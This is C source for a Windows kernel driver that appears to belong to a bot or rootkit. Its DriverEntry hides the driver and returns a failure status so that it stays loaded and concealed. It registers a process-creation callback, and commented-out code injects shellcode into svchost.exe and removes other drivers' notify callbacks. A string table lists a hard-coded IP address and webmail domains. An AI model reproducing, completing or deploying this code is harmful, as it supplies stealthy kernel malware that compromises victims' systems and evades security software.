//#define _HIDE_DRIVER_NAME	L"vmnetx86.sys"
#pragma warning ( disable : 4022 )
#include "bot_entry.h"
#include "bot_inject.h"
//#include "bot_hidefs.h"
char *szFake[] = {
	"208.66.194.215"
	"gmail.com",
	"hotmail.com",
	"yahoo.com",
	"aol.com",
	"services.exe",
	"error inject",
	NULL
};
//-----------------------------------------------------------------------
/*VOID UnloadNotifyRoutines()
{
	ULONG_PTR Start = 0, b = 0, End = 0;
	PSYSTEM_MODULE_INFORMATION pModules = GetSysInfo(SystemModuleInformation);
	for (b = 0; b < pModules->Reserved[0]; b++)
	{
		Start = (ULONG_PTR)pModules->Base;
		End   = Start + pModules->Size;
		for ( Start; Start <= End ; Start += 1 )
		{
			if ( !PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)Start, TRUE) )
			{
				Dbg("UnloadNotifyRoutines : Notify[%ws] routine %p, deleted\n", Start,pModules->ImageName);
			}
		}
	}
}*/
//-----------------------------------------------------------------------
VOID FakeMain(PVOID pParam)
{
	ULONG nProcessId;
	NTSTATUS nStat;
	__try { 
		g_Offsets(NtBuildNumber);
		
		// set process notify routine
		PsSetCreateProcessNotifyRoutine(NotifyRoutine,FALSE);	

		// inject into svchost.exe 
		/*nProcessId = (ULONG)GetProcessIdByProcessName(L"svchost.exe");
		if(nProcessId)
			InjectMemory(&dll_inject_shellcode,sizeof(dll_inject_shellcode),nProcessId,0x6E);*/
	}	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		Dbg("Error except !! %s %d\n",__FILE__,__LINE__);
	}	
}
//-----------------------------------------------------------------------
#ifdef _DEBUG_
VOID DriverUnload(PDRIVER_OBJECT pDrvObj)
{
	Dbg("Driver unload\n");
	ASSERTMSG("Driver unload : Error",PsSetCreateProcessNotifyRoutine(NotifyRoutine,TRUE));
}
#endif
//-----------------------------------------------------------------------
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegPath)
{
	ULONG nOffset = (ULONG)((ULONG)FakeMain - (DWORD)DriverObject->DriverStart);
	NTSTATUS nStat = STATUS_UNSUCCESSFUL;

#ifdef _DEBUG_
	DriverObject->DriverUnload = DriverUnload;
#endif
	nStat = HideDriver(DriverObject,nOffset);
#ifdef _DEBUG_
	return STATUS_SUCCESS;
#endif
	return STATUS_UNSUCCESSFUL;
}